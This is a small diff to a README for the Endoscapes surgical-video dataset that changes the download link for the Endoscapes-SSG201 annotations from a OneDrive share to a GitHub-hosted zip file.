@@ -18,7 +18,7 @@ Endoscapes-SG201 provides:
 
 Download the Endoscapes dataset from [![Download Endoscapes](https://img.shields.io/badge/Download-Endoscapes-blue)](https://github.com/CAMMA-public/Endoscapes)
 
-Download Endoscapes-SSG201 from [![Endoscapes-SSG201](https://img.shields.io/badge/Download-Endoscapes--SSG201%20Annotations-green)](https://1drv.ms/u/c/56d948a627b33139/EbqOPJgj0khEuDYYz0593g4B8vvysiOjLDq1LvbNeQqt8A?e=ePG9ux)
+Download Endoscapes-SSG201 from [![Endoscapes-SSG201](https://github.com/user-attachments/files/22583579/Endoscapes-SG201.zip)
 
 
 The final directory structure should be as follows:
